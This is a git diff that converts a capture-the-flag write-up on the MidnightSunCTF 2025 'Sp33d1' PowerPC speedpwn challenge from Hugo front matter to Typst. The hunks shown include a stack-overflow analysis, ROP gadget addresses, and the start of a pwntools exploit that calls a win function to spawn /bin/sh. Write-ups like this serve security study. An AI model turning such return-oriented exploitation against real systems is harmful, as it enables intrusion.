@@ -1,10 +1,15 @@
-+++
-title = 'MidnightSunCTF 2025 - Sp33d1'
-date = 2025-05-18T18:00:02-03:00
-tags = ['pwn', 'ctf']
-draft = false
-+++
+#import "./html_elements.typ": post
 
+#show: post
+
+// +++
+// title = 'MidnightSunCTF 2025 - Sp33d1'
+// date = 2025-05-18T18:00:02-03:00
+// tags = ['pwn', 'ctf']
+// draft = false
+// +++
+
+= Sp33d1
 
 This was a speedpwn challenge. I unfortunately wasn't able to play the CTF, it
 only lasted 24h and I was busy the whole saturday, some kind of shabbos you can say.
@@ -68,9 +73,9 @@ blr
 
 Note that at the function's epilogue we have:
 
-- `lwz r0, 4(r11)`  <- load `r11[4]` to `r0`
-- `mtlr r0` <- move `r0` to link register 
-- `blr` <- branch to link register
+- `lwz r0, 4(r11)`  > load `r11[4]` to `r0`
+- `mtlr r0` > move `r0` to link register
+- `blr` > branch to link register
 
 In gdb those are the registers right at the function's epilogue. By
 sending an input with `cyclic(0x100)` we can see that we control:
@@ -128,7 +133,7 @@ There a a few things that make our life easier:
 - there's no PIE.
 - the ELF is statically linked.
 - we have the `/bin/sh` string at `0x10077a8c`
-- we have the `win` function at `0x100005f8` which calls system 
+- we have the `win` function at `0x100005f8` which calls system
 
 
 The only thing we need to do is to setup the `/bin/sh` as the first argument,
@@ -140,7 +145,7 @@ worked.
 
 Most gadgets found by the tool look like this:
 
-- 0x100716e4: add r1, r1, r10; blr; 
+- 0x100716e4: add r1, r1, r10; blr;
 
 This is different that I'm used to do when ROP'ing, since x64 the `ret`
 instruction can be used to chain our ROP. Below is the full solution:
@@ -156,7 +161,7 @@ context(arch='PowerPC', bits=32, endian='big')
 #io = gdb.debug('./sp33d1', 'b main')
 io = process('./sp33d1')
 
-set_r3 = 0x100712b4 # lwz r3, 0x10(r1); lwz r0, 0x24(r1); lwz r30, 0x18(r1); addi r1, r1, 0x20; mtlr r0; blr; 
+set_r3 = 0x100712b4 # lwz r3, 0x10(r1); lwz r0, 0x24(r1); lwz r30, 0x18(r1); addi r1, r1, 0x20; mtlr r0; blr;
 
 win = 0x100005f8
 bin_sh = 0x10077a8c
